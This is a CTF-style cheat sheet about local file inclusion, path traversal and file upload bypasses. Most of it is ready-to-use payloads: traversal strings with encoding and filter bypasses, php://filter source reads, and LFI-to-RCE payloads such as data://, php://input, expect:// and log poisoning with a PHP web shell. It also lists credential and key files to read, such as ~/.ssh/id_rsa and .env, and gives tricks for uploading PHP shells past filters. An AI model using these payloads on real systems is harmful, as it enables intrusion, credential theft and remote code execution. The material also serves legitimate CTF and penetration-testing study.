---
title: Reflex — Web — LFI & Upload
date: 2026-08-26T00:00:00.000Z
summary: >-
  Path traversal and file upload: how to tell which one you have, and the route
  from reading a file to code execution.
tags:
  - reflexe
  - lfi
  - web
draft: false
featured: false
source: CTF/03-Reflexes/Reflexe-Web-LFI-et-Upload.md
topic: web
kind: reflex
---
# Reflex — LFI / Path Traversal / Upload

## 🔍 When
- A parameter that smells like a file: `?page=home`, `?file=report.pdf`, `?lang=fr`, `?include=`.
- Signal: `?page=../../../../etc/passwd` returns `root:x:0:0:` lines.

## ⚡ The first 3 things
1. `../../../../../../etc/passwd` — the basics. Add `../` until you climb out.
2. If filtered, **PHP wrappers**: `php://filter` reads the source code (often the key).
3. Look for a way to make your payload get written into a file → **LFI → RCE**.

## 🧰 Payloads

```
# basic read
../../../../../../etc/passwd
....//....//....//etc/passwd        # bypasses a naive strip of "../"
..%2f..%2f..%2fetc%2fpasswd         # url-encoded
/etc/passwd%00                      # null byte (PHP < 5.3.4)

# read the source in base64 (does not execute it)
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php   # ← often the DB creds

# LFI → RCE
data://text/plain,<?php system($_GET['c']); ?>&c=id
php://input   (POST body = <?php system('id'); ?>)
expect://id

# log poisoning: inject PHP into a log then include it
# User-Agent: <?php system($_GET['c']); ?>  then  ?page=/var/log/apache2/access.log&c=id
```

## Files to read first
```
/etc/passwd  /etc/hosts  /proc/self/environ  /proc/self/cmdline
config.php  wp-config.php  .env  /var/www/html/index.php
~/.ssh/id_rsa  ~/.bash_history  /root/root.txt
C:\Windows\System32\drivers\etc\hosts   C:\inetpub\wwwroot\web.config
```

## Upload (the cousin)
| Filter | Workaround |
|---|---|
| extension | `shell.php.jpg`, `shell.phtml`, `shell.pHp`, double ext |
| content-type | change the `Content-Type: image/png` header |
| magic bytes | prefix the file with `GIF89a;` before the `<?php` |
| `.htaccess` allowed | upload a `.htaccess` that maps `.jpg` → php |

## 🚧 What blocks you
- LFI but no RCE found → **php://filter on every config file**, the flag or creds are
  there 1 time out of 2. Don't fixate on RCE if the flag is a file.

## ✅ I've won when
You read a file outside the webroot, or you run `id`.

## 🔗 Used in
-
